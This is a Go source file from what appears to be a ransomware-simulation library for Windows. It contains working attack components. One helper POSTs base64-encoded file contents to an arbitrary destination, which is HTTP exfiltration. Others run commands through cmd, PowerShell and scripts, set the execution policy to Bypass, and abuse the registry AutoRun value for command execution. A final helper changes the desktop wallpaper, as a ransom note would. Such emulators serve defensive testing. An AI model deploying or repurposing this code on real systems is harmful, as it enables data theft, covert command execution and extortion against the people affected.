//+build windows

package ransimware

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"os/exec"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"gitlab.com/mjwhitta/win/winhttp/http"
)

func executeBat(
	name string,
	cmds []string,
	clean bool,
) (string, error) {
	var e error
	var o []byte

	// Create bat script
	if e = writeScript(name, cmds); e != nil {
		return "", e
	}

	// Run bat script
	o, e = exec.Command(name).Output()

	// Clean up if requested
	if clean {
		os.Remove(name)
	}

	return strings.TrimSpace(string(o)), e
}

func executePS1(
	name string,
	cmds []string,
	clean bool,
) (string, error) {
	var e error
	var o []byte
	var old string

	// Create ps1 script
	if e = writeScript(name, cmds); e != nil {
		return "", e
	}

	if clean {
		old, e = executeShell(
			"powershell",
			[]string{"Get-ExecutionPolicy -Scope CurrentUser"},
		)
		if e != nil {
			return "", nil
		}
	}

	// Allow unsigned scripts to run
	_, e = executeShell(
		"powershell",
		[]string{"Set-ExecutionPolicy -Scope CurrentUser Bypass"},
	)
	if e != nil {
		return "", e
	}

	// Run ps1 script
	o, e = exec.Command("powershell", "-File", name).Output()

	// Clean up if requested
	if clean {
		os.Remove(name)

		// Restore old policy
		if old != "" {
			_, e = executeShell(
				"powershell",
				[]string{
					"Set-ExecutionPolicy -Scope CurrentUser " + old,
				},
			)
		}
	}

	return strings.TrimSpace(string(o)), e
}

func executeRegistry(cmds []string, clean bool) (string, error) {
	var e error
	var found bool
	var k registry.Key
	var o []byte
	var old string
	var out []string

	// Create key
	k, found, e = registry.CreateKey(
		registry.CURRENT_USER,
		"Software\\Microsoft\\Command Processor",
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if e != nil {
		return "", e
	}

	// Get old value
	if found {
		old, _, _ = k.GetStringValue("AutoRun")
	}

	for _, cmd := range cmds {
		// Set new value
		if e = k.SetStringValue("AutoRun", cmd); e != nil {
			return "", e
		}

		// Run cmd
		o, e = exec.Command("cmd", "/C", "echo off").Output()
		if e != nil {
			return strings.Join(out, "\n"), e
		}

		out = append(out, strings.TrimSpace(string(o)))
	}

	if !clean {
		return strings.Join(out, "\n"), nil
	}

	// Clean up if requested
	if !found {
		// Delete key if not found
		e = registry.DeleteKey(
			registry.CURRENT_USER,
			"Software\\Microsoft\\Command Processor",
		)
		if e != nil {
			return strings.Join(out, "\n"), e
		}
	} else if old != "" {
		// Restore old value
		if e = k.SetStringValue("AutoRun", old); e != nil {
			return strings.Join(out, "\n"), e
		}
	} else {
		// Delete new value if no old value
		if e = k.DeleteValue("AutoRun"); e != nil {
			return strings.Join(out, "\n"), e
		}
	}

	return strings.Join(out, "\n"), nil
}

// ExecuteScript will run shell commands using the provided method, as
// well as attempt to clean up artificats, if requested.
func ExecuteScript(
	method string,
	clean bool,
	cmds ...string,
) (string, error) {
	if len(cmds) == 0 {
		return "", nil
	}

	switch method {
	case "bat":
		return executeBat(cmds[0], cmds[1:], clean)
	case "cmd", "shell":
		return executeShell("cmd", cmds)
	case "powershell":
		return executeShell("powershell", cmds)
	case "ps1":
		return executePS1(cmds[0], cmds[1:], clean)
	case "registry":
		return executeRegistry(cmds, clean)
	default:
		return "", fmt.Errorf("Unsupported method")
	}
}

func executeShell(shell string, cmds []string) (string, error) {
	var e error
	var flag string
	var o []byte
	var out []string

	switch shell {
	case "cmd":
		flag = "/C"
	case "powershell":
		flag = "-c"
	default:
		return "", fmt.Errorf("Unsupported shell: %s", shell)
	}

	// Run cmds
	for _, cmd := range cmds {
		o, e = exec.Command(shell, flag, cmd).Output()

		if len(o) > 0 {
			out = append(out, strings.TrimSpace(string(o)))
		}

		if e != nil {
			return strings.Join(out, "\n"), e
		}
	}

	return strings.Join(out, "\n"), nil
}

// HTTPExfil will return a function pointer to an ExfilFunc that
// exfils via HTTP POST requests with the specified headers.
func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
	return func(path string, b []byte) error {
		var b64 string
		var data []byte
		var e error
		var n int
		var stream = bytes.NewReader(b)
		var tmp [4 * 1024 * 1024]byte

		for {
			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
				return nil
			} else if e != nil {
				return e
			}

			// Create request
			b64 = base64.StdEncoding.EncodeToString(tmp[:n])
			data = []byte(path + " " + b64)

			// Send Message
			http.Post(dst, headers, data)
		}
	}
}

// WallpaperNotify is a NotifyFunc that sets the background wallpaper.
func WallpaperNotify(image string, png []byte) NotifyFunc {
	return func() error {
		var e error
		var f *os.File
		var spiSetdeskwallpaper uintptr = 0x0014
		var spifSendchange uintptr = 0x0002
		var spifUpdateinifile uintptr = 0x0001
		var user32 *windows.LazyDLL

		// Create image file
		if f, e = os.Create(image); e != nil {
			return e
		}

		// Write PNG to file
		f.Write(png)
		f.Close()

		// Change background with Windows API
		user32 = windows.NewLazySystemDLL("User32")
		user32.NewProc("SystemParametersInfoA").Call(
			spiSetdeskwallpaper,
			0,
			uintptr(unsafe.Pointer(&[]byte(image)[0])),
			spifSendchange|spifUpdateinifile,
		)

		// Remove image file
		os.Remove(image)

		return nil
	}
}

func writeScript(name string, cmds []string) error {
	var e error
	var f *os.File

	// Open script
	if f, e = os.Create(name); e != nil {
		return e
	}
	defer f.Close()

	// Write script
	for _, cmd := range cmds {
		if _, e = f.WriteString(cmd + "\n"); e != nil {
			return e
		}
	}

	return nil
}
